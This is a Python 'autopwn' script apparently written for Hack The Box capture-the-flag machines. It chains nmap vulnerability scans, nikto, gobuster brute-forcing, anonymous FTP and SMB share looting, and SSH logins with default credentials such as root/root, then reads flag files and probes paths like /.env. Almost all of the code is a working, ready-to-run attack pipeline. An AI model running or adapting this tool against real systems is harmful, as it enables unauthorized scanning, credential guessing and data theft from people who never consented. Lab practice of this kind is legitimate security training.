#!/usr/bin/env python3
"""
HTB Automated Flag Reveal System
Automated network scanning, vulnerability detection, and exploitation
"""

import subprocess
import json
import re
import sys
import os
import argparse
import logging
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import xml.etree.ElementTree as ET

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(f'htb_auto_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)


class Colors:
    """Terminal colors for output formatting"""
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class NetworkScanner:
    """Network scanning functionality using nmap"""
    
    def __init__(self, target: str):
        self.target = target
        self.scan_results = {}
        
    def quick_scan(self) -> Dict:
        """Quick scan to discover open ports"""
        logger.info(f"{Colors.OKBLUE}Starting quick port scan on {self.target}{Colors.ENDC}")
        
        try:
            cmd = [
                'nmap', '-T4', '-F', '--open',
                '-oX', '/tmp/quick_scan.xml',
                self.target
            ]
            subprocess.run(cmd, check=True, capture_output=True, timeout=300)
            
            return self._parse_nmap_xml('/tmp/quick_scan.xml')
        except subprocess.TimeoutExpired:
            logger.error("Quick scan timed out")
            return {}
        except Exception as e:
            logger.error(f"Quick scan failed: {e}")
            return {}
    
    def detailed_scan(self, ports: List[int]) -> Dict:
        """Detailed scan on discovered ports with version detection and scripts"""
        if not ports:
            logger.warning("No ports provided for detailed scan")
            return {}
        
        port_list = ','.join(map(str, ports))
        logger.info(f"{Colors.OKBLUE}Running detailed scan on ports: {port_list}{Colors.ENDC}")
        
        try:
            cmd = [
                'nmap', '-sV', '-sC', '-O', '-A',
                '-p', port_list,
                '--script=vuln',
                '-oX', '/tmp/detailed_scan.xml',
                self.target
            ]
            subprocess.run(cmd, check=True, capture_output=True, timeout=600)
            
            return self._parse_nmap_xml('/tmp/detailed_scan.xml')
        except subprocess.TimeoutExpired:
            logger.error("Detailed scan timed out")
            return {}
        except Exception as e:
            logger.error(f"Detailed scan failed: {e}")
            return {}
    
    def _parse_nmap_xml(self, xml_file: str) -> Dict:
        """Parse nmap XML output"""
        try:
            tree = ET.parse(xml_file)
            root = tree.getroot()
            
            results = {
                'host': self.target,
                'ports': [],
                'os': '',
                'vulnerabilities': []
            }
            
            # Parse ports and services
            for port in root.findall('.//port'):
                port_id = port.get('portid')
                protocol = port.get('protocol')
                state = port.find('state')
                service = port.find('service')
                
                if state is not None and state.get('state') == 'open':
                    port_info = {
                        'port': int(port_id),
                        'protocol': protocol,
                        'service': service.get('name', '') if service is not None else '',
                        'version': service.get('product', '') if service is not None else '',
                        'extrainfo': service.get('extrainfo', '') if service is not None else '',
                        'scripts': []
                    }
                    
                    # Parse script output
                    for script in port.findall('script'):
                        script_info = {
                            'id': script.get('id'),
                            'output': script.get('output', '')
                        }
                        port_info['scripts'].append(script_info)
                        
                        # Check for vulnerabilities
                        if 'vuln' in script.get('id', ''):
                            results['vulnerabilities'].append({
                                'port': port_id,
                                'script': script.get('id'),
                                'details': script.get('output', '')
                            })
                    
                    results['ports'].append(port_info)
            
            # Parse OS detection
            for os_match in root.findall('.//osmatch'):
                results['os'] = os_match.get('name', '')
                break
            
            return results
        except Exception as e:
            logger.error(f"Failed to parse nmap XML: {e}")
            return {}


class VulnerabilityDetector:
    """Detect and analyze vulnerabilities"""
    
    def __init__(self, scan_results: Dict):
        self.scan_results = scan_results
        self.vulnerabilities = []
    
    def analyze(self) -> List[Dict]:
        """Analyze scan results for vulnerabilities"""
        logger.info(f"{Colors.OKBLUE}Analyzing for vulnerabilities...{Colors.ENDC}")
        
        # Check nmap vuln scripts
        if 'vulnerabilities' in self.scan_results:
            self.vulnerabilities.extend(self.scan_results['vulnerabilities'])
        
        # Check for common vulnerable services
        for port_info in self.scan_results.get('ports', []):
            service = port_info.get('service', '').lower()
            version = port_info.get('version', '').lower()
            port = port_info.get('port')
            
            # Check for common vulnerabilities
            if 'ftp' in service and port == 21:
                self._check_ftp_anonymous(port)
            elif 'ssh' in service and port == 22:
                self._check_ssh_weaknesses(port, version)
            elif 'http' in service or 'https' in service:
                self._check_web_vulnerabilities(port, service)
            elif 'smb' in service or port in [139, 445]:
                self._check_smb_vulnerabilities(port)
            elif 'mysql' in service or port == 3306:
                self._check_mysql_vulnerabilities(port)
            elif 'postgresql' in service or port == 5432:
                self._check_postgresql_vulnerabilities(port)
        
        return self.vulnerabilities
    
    def _check_ftp_anonymous(self, port: int):
        """Check for anonymous FTP access"""
        logger.info(f"Checking FTP anonymous login on port {port}")
        try:
            result = subprocess.run(
                ['nmap', '--script=ftp-anon', '-p', str(port), self.scan_results['host']],
                capture_output=True, timeout=60, text=True
            )
            if 'Anonymous FTP login allowed' in result.stdout:
                self.vulnerabilities.append({
                    'type': 'ftp_anonymous',
                    'port': port,
                    'severity': 'high',
                    'description': 'Anonymous FTP login enabled'
                })
        except Exception as e:
            logger.debug(f"FTP check failed: {e}")
    
    def _check_ssh_weaknesses(self, port: int, version: str):
        """Check for SSH vulnerabilities"""
        logger.info(f"Checking SSH vulnerabilities on port {port}")
        self.vulnerabilities.append({
            'type': 'ssh',
            'port': port,
            'severity': 'medium',
            'description': f'SSH service detected: {version}',
            'version': version
        })
    
    def _check_web_vulnerabilities(self, port: int, service: str):
        """Check for web application vulnerabilities"""
        logger.info(f"Checking web vulnerabilities on port {port}")
        
        # Run nikto scan
        try:
            protocol = 'https' if 'https' in service else 'http'
            url = f"{protocol}://{self.scan_results['host']}:{port}"
            
            result = subprocess.run(
                ['nikto', '-h', url, '-maxtime', '120s'],
                capture_output=True, timeout=150, text=True
            )
            
            if result.stdout:
                self.vulnerabilities.append({
                    'type': 'web',
                    'port': port,
                    'severity': 'medium',
                    'description': 'Web server detected',
                    'nikto_output': result.stdout
                })
        except Exception as e:
            logger.debug(f"Web vulnerability check failed: {e}")
    
    def _check_smb_vulnerabilities(self, port: int):
        """Check for SMB vulnerabilities"""
        logger.info(f"Checking SMB vulnerabilities on port {port}")
        try:
            result = subprocess.run(
                ['nmap', '--script=smb-vuln*', '-p', str(port), self.scan_results['host']],
                capture_output=True, timeout=120, text=True
            )
            
            if 'VULNERABLE' in result.stdout:
                self.vulnerabilities.append({
                    'type': 'smb',
                    'port': port,
                    'severity': 'critical',
                    'description': 'SMB vulnerability detected',
                    'details': result.stdout
                })
        except Exception as e:
            logger.debug(f"SMB check failed: {e}")
    
    def _check_mysql_vulnerabilities(self, port: int):
        """Check for MySQL vulnerabilities"""
        logger.info(f"Checking MySQL vulnerabilities on port {port}")
        self.vulnerabilities.append({
            'type': 'mysql',
            'port': port,
            'severity': 'medium',
            'description': 'MySQL service detected'
        })
    
    def _check_postgresql_vulnerabilities(self, port: int):
        """Check for PostgreSQL vulnerabilities"""
        logger.info(f"Checking PostgreSQL vulnerabilities on port {port}")
        self.vulnerabilities.append({
            'type': 'postgresql',
            'port': port,
            'severity': 'medium',
            'description': 'PostgreSQL service detected'
        })


class Exploiter:
    """Automated exploitation module"""
    
    def __init__(self, target: str, vulnerabilities: List[Dict]):
        self.target = target
        self.vulnerabilities = vulnerabilities
        self.flags = []
    
    def exploit(self) -> List[str]:
        """Attempt to exploit discovered vulnerabilities"""
        logger.info(f"{Colors.OKBLUE}Starting exploitation phase...{Colors.ENDC}")
        
        for vuln in self.vulnerabilities:
            vuln_type = vuln.get('type')
            port = vuln.get('port')
            
            if vuln_type == 'ftp_anonymous':
                self._exploit_ftp_anonymous(port)
            elif vuln_type == 'ssh':
                self._exploit_ssh(port, vuln)
            elif vuln_type == 'web':
                self._exploit_web(port)
            elif vuln_type == 'smb':
                self._exploit_smb(port)
        
        return self.flags
    
    def _exploit_ftp_anonymous(self, port: int):
        """Exploit anonymous FTP access"""
        logger.info(f"{Colors.WARNING}Attempting FTP anonymous exploitation on port {port}{Colors.ENDC}")
        try:
            # Use lftp to connect and download files
            commands = f"open -u anonymous, {self.target}:{port}; ls; find; bye"
            result = subprocess.run(
                ['lftp', '-c', commands],
                capture_output=True, timeout=60, text=True
            )
            
            self._extract_flags_from_output(result.stdout, 'FTP')
        except Exception as e:
            logger.debug(f"FTP exploitation failed: {e}")
    
    def _exploit_ssh(self, port: int, vuln: Dict):
        """Attempt SSH exploitation"""
        logger.info(f"{Colors.WARNING}Checking SSH on port {port}{Colors.ENDC}")
        
        # Try common credentials
        common_creds = [
            ('root', 'root'),
            ('admin', 'admin'),
            ('user', 'user'),
            ('htb', 'htb')
        ]
        
        for username, password in common_creds:
            try:
                result = subprocess.run(
                    ['sshpass', '-p', password, 'ssh', '-o', 'StrictHostKeyChecking=no',
                     '-o', 'ConnectTimeout=5', f'{username}@{self.target}', '-p', str(port),
                     'cat /root/flag.txt /home/*/flag.txt /flag.txt 2>/dev/null || echo "No flag"'],
                    capture_output=True, timeout=10, text=True
                )
                
                if 'flag' in result.stdout.lower() or 'htb{' in result.stdout.lower():
                    self._extract_flags_from_output(result.stdout, 'SSH')
                    break
            except Exception as e:
                logger.debug(f"SSH attempt with {username}:{password} failed: {e}")
    
    def _exploit_web(self, port: int):
        """Exploit web vulnerabilities"""
        logger.info(f"{Colors.WARNING}Attempting web exploitation on port {port}{Colors.ENDC}")
        
        # Try to access common flag locations
        protocol = 'https' if port == 443 else 'http'
        base_url = f"{protocol}://{self.target}:{port}"
        
        paths = [
            '/flag.txt',
            '/flag',
            '/root.txt',
            '/user.txt',
            '/.git/HEAD',
            '/admin',
            '/robots.txt',
            '/.env'
        ]
        
        for path in paths:
            try:
                result = subprocess.run(
                    ['curl', '-k', '-s', '--max-time', '5', f'{base_url}{path}'],
                    capture_output=True, timeout=10, text=True
                )
                
                self._extract_flags_from_output(result.stdout, f'WEB:{path}')
            except Exception as e:
                logger.debug(f"Web path {path} failed: {e}")
        
        # Try directory bruteforcing
        self._web_directory_bruteforce(base_url)
    
    def _web_directory_bruteforce(self, base_url: str):
        """Bruteforce web directories"""
        try:
            result = subprocess.run(
                ['gobuster', 'dir', '-u', base_url, '-w', 
                 '/usr/share/wordlists/dirb/common.txt', '-t', '20', '-q', '--timeout', '30s'],
                capture_output=True, timeout=60, text=True
            )
            
            # Check discovered directories for flags
            for line in result.stdout.split('\n'):
                if 'Status: 200' in line:
                    match = re.search(r'(/\S+)', line)
                    if match:
                        path = match.group(1)
                        try:
                            content_result = subprocess.run(
                                ['curl', '-k', '-s', '--max-time', '5', f'{base_url}{path}'],
                                capture_output=True, timeout=10, text=True
                            )
                            self._extract_flags_from_output(content_result.stdout, f'WEB:{path}')
                        except:
                            pass
        except Exception as e:
            logger.debug(f"Directory bruteforce failed: {e}")
    
    def _exploit_smb(self, port: int):
        """Exploit SMB vulnerabilities"""
        logger.info(f"{Colors.WARNING}Attempting SMB exploitation on port {port}{Colors.ENDC}")
        
        # List shares
        try:
            result = subprocess.run(
                ['smbclient', '-L', f'//{self.target}', '-N'],
                capture_output=True, timeout=30, text=True
            )
            
            # Try to access shares
            shares = re.findall(r'^\s+(\S+)\s+Disk', result.stdout, re.MULTILINE)
            
            for share in shares:
                try:
                    share_result = subprocess.run(
                        ['smbclient', f'//{self.target}/{share}', '-N', '-c', 
                         'ls; get flag.txt /tmp/smb_flag.txt; get root.txt /tmp/smb_root.txt'],
                        capture_output=True, timeout=30, text=True
                    )
                    
                    self._extract_flags_from_output(share_result.stdout, f'SMB:{share}')
                    
                    # Check downloaded files
                    for tmp_file in ['/tmp/smb_flag.txt', '/tmp/smb_root.txt']:
                        if os.path.exists(tmp_file):
                            with open(tmp_file, 'r') as f:
                                self._extract_flags_from_output(f.read(), f'SMB:{share}')
                except:
                    pass
        except Exception as e:
            logger.debug(f"SMB exploitation failed: {e}")
    
    def _extract_flags_from_output(self, output: str, source: str):
        """Extract flags from command output"""
        # Common HTB flag patterns
        patterns = [
            r'[a-f0-9]{32}',  # MD5-like hashes
            r'HTB\{[^\}]+\}',  # HTB{...} format
            r'flag\{[^\}]+\}',  # flag{...} format
            r'[a-f0-9]{64}',  # SHA256-like hashes
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, output, re.IGNORECASE)
            for match in matches:
                if match not in self.flags:
                    logger.info(f"{Colors.OKGREEN}[FLAG FOUND] {source}: {match}{Colors.ENDC}")
                    self.flags.append({
                        'flag': match,
                        'source': source,
                        'timestamp': datetime.now().isoformat()
                    })


class HTBAutoPwn:
    """Main orchestration class"""
    
    def __init__(self, target: str, output_file: Optional[str] = None):
        self.target = target
        self.output_file = output_file or f'htb_results_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        self.results = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'scan_results': {},
            'vulnerabilities': [],
            'flags': []
        }
    
    def run(self):
        """Main execution flow"""
        logger.info(f"{Colors.HEADER}{Colors.BOLD}╔══════════════════════════════════════════════╗{Colors.ENDC}")
        logger.info(f"{Colors.HEADER}{Colors.BOLD}║   HTB Automated Flag Reveal System          ║{Colors.ENDC}")
        logger.info(f"{Colors.HEADER}{Colors.BOLD}║   Target: {self.target:<30} ║{Colors.ENDC}")
        logger.info(f"{Colors.HEADER}{Colors.BOLD}╚══════════════════════════════════════════════╝{Colors.ENDC}")
        
        # Phase 1: Network Scanning
        logger.info(f"\n{Colors.BOLD}[PHASE 1] Network Scanning{Colors.ENDC}")
        scanner = NetworkScanner(self.target)
        
        quick_results = scanner.quick_scan()
        if not quick_results or not quick_results.get('ports'):
            logger.error(f"{Colors.FAIL}No open ports found. Exiting.{Colors.ENDC}")
            return
        
        open_ports = [p['port'] for p in quick_results.get('ports', [])]
        logger.info(f"{Colors.OKGREEN}Open ports found: {open_ports}{Colors.ENDC}")
        
        detailed_results = scanner.detailed_scan(open_ports)
        self.results['scan_results'] = detailed_results
        
        # Phase 2: Vulnerability Detection
        logger.info(f"\n{Colors.BOLD}[PHASE 2] Vulnerability Detection{Colors.ENDC}")
        detector = VulnerabilityDetector(detailed_results)
        vulnerabilities = detector.analyze()
        self.results['vulnerabilities'] = vulnerabilities
        
        logger.info(f"{Colors.OKGREEN}Found {len(vulnerabilities)} potential vulnerabilities{Colors.ENDC}")
        for vuln in vulnerabilities:
            logger.info(f"  - {vuln.get('type')} on port {vuln.get('port')} (Severity: {vuln.get('severity')})")
        
        # Phase 3: Exploitation
        logger.info(f"\n{Colors.BOLD}[PHASE 3] Exploitation{Colors.ENDC}")
        exploiter = Exploiter(self.target, vulnerabilities)
        flags = exploiter.exploit()
        self.results['flags'] = flags
        
        # Save results
        self._save_results()
        
        # Summary
        self._print_summary()
    
    def _save_results(self):
        """Save results to JSON file"""
        try:
            with open(self.output_file, 'w') as f:
                json.dump(self.results, f, indent=2)
            logger.info(f"\n{Colors.OKGREEN}Results saved to: {self.output_file}{Colors.ENDC}")
        except Exception as e:
            logger.error(f"Failed to save results: {e}")
    
    def _print_summary(self):
        """Print execution summary"""
        logger.info(f"\n{Colors.HEADER}{Colors.BOLD}╔══════════════════════════════════════════════╗{Colors.ENDC}")
        logger.info(f"{Colors.HEADER}{Colors.BOLD}║             EXECUTION SUMMARY                ║{Colors.ENDC}")
        logger.info(f"{Colors.HEADER}{Colors.BOLD}╚══════════════════════════════════════════════╝{Colors.ENDC}")
        
        logger.info(f"\n{Colors.OKBLUE}Target:{Colors.ENDC} {self.target}")
        logger.info(f"{Colors.OKBLUE}Open Ports:{Colors.ENDC} {len(self.results['scan_results'].get('ports', []))}")
        logger.info(f"{Colors.OKBLUE}Vulnerabilities:{Colors.ENDC} {len(self.results['vulnerabilities'])}")
        logger.info(f"{Colors.OKBLUE}Flags Found:{Colors.ENDC} {len(self.results['flags'])}")
        
        if self.results['flags']:
            logger.info(f"\n{Colors.OKGREEN}{Colors.BOLD}FLAGS DISCOVERED:{Colors.ENDC}")
            for flag_info in self.results['flags']:
                logger.info(f"  {Colors.OKGREEN}✓{Colors.ENDC} {flag_info['flag']} (from {flag_info['source']})")
        else:
            logger.info(f"\n{Colors.WARNING}No flags found automatically. Manual exploitation may be required.{Colors.ENDC}")


def main():
    parser = argparse.ArgumentParser(
        description='HTB Automated Flag Reveal System',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python3 htb_auto_pwn.py -t 10.10.10.100
  python3 htb_auto_pwn.py -t 10.10.10.100 -o results.json
  python3 htb_auto_pwn.py -t target.htb -v
        '''
    )
    
    parser.add_argument('-t', '--target', required=True, help='Target IP address or hostname')
    parser.add_argument('-o', '--output', help='Output file for results (JSON)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Check for required tools
    required_tools = ['nmap', 'nikto', 'gobuster', 'smbclient', 'curl', 'sshpass', 'lftp']
    missing_tools = []
    
    for tool in required_tools:
        try:
            subprocess.run(['which', tool], capture_output=True, check=True)
        except:
            missing_tools.append(tool)
    
    if missing_tools:
        logger.warning(f"{Colors.WARNING}Missing tools: {', '.join(missing_tools)}{Colors.ENDC}")
        logger.warning("Some functionality may be limited. Install with: apt-get install <tool>")
    
    # Run the automation
    autopwn = HTBAutoPwn(args.target, args.output)
    autopwn.run()


if __name__ == '__main__':
    main()
